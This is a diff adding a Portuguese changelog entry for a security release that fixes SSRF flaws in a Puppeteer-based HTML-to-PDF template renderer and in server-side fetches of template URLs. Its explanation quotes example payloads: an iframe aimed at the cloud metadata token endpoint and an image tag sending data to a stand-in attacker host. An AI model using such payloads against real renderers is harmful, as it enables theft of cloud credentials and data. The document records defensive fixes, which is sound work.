@@ -6,6 +6,53 @@ Todas as mudanças relevantes do sistema. Formato baseado em [Keep a Changelog](
 
 ---
 
+## [4.63.13+20260528-security-ssrf-lockdown] — 2026-05-28
+
+Release **pós-auditoria Sprint v4.63 (parte 2)** — security lockdown.
+Ataca Security #2 + #5 dos achados do Agent.
+
+**Security #2 (HIGH) — SSRF via Puppeteer HTML render**:
+Templates HTML são arbitrários do uploader (com `templates_manage`).
+Antes desta release, `page.setContent(rendered)` rodava sem intercepção
+de requests — atacante poderia incluir `<iframe src="http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token">`
+ou `<img src="http://attacker.com/log?ip=...">` e exfiltrar via render PDF.
+
+Fix: `page.setRequestInterception(true)` + allowlist:
+- `data:` URIs (inline images / fonts embeddeds)
+- `about:` (Chromium internal)
+- R2 origin (`pub-ad909dc0c977450a93ee5faa79c7374d.r2.dev`)
+- Google Fonts (`fonts.googleapis.com`, `fonts.gstatic.com`) — uso comum
+  em templates premium
+
+Tudo o mais é abortado com warn log (`[renderTemplate SSRF block]`).
+`networkidle0` continua funcionando porque requests abortadas contam
+como concluídas. Custo: zero overhead em templates legítimos
+(que só usam assets R2 + fontes). Atacante apenas vê requests bloqueadas
+no log do CF — sem dados retornados.
+
+**Security #5 (MEDIUM) — fileUrl validation**:
+Antes, qualquer admin com Firestore write podia editar `templates.{id}.fileUrl`
+pra apontar pra interno (`http://internal-svc/secrets`), serviços de
+metadados (`http://metadata.google.internal/`), ou repositórios privados.
+CF fazia `fetch(tpl.fileUrl)` server-side → SSRF.
+
+Fix: helper `_validateR2FileUrl(url)` chamado ANTES de cada `fetch` em:
+- `extractPlaceholders` (linha ~972, onCreate trigger)
+- `renderTemplate` (linha ~1056, callable)
+- `duplicateTemplate` (linha ~1227, callable — copia source)
+
+Aceita apenas URLs que começam com `https://pub-ad909dc0c977450a93ee5faa79c7374d.r2.dev/`,
+sem `..` (path traversal) ou `@` (auth embebido). Defesa em profundidade
+mesmo se Firestore Rules forem alteradas.
+
+**Arquivos tocados**: `functions/index.js` (constante R2_PUBLIC_ORIGIN +
+helper validateR2FileUrl + 3 guards em CFs + Puppeteer interception),
+`index.html`, `js/version.js`, `CHANGELOG.md`.
+
+**Deploy obrigatório**: `firebase deploy --only functions:extractPlaceholders,functions:renderTemplate,functions:duplicateTemplate`.
+
+---
+
 ## [4.63.12+20260528-post-audit-safetynet-zumbis] — 2026-05-28
 
 Release **pós-auditoria Sprint v4.63** — safety-net UX + zumbis fáceis.
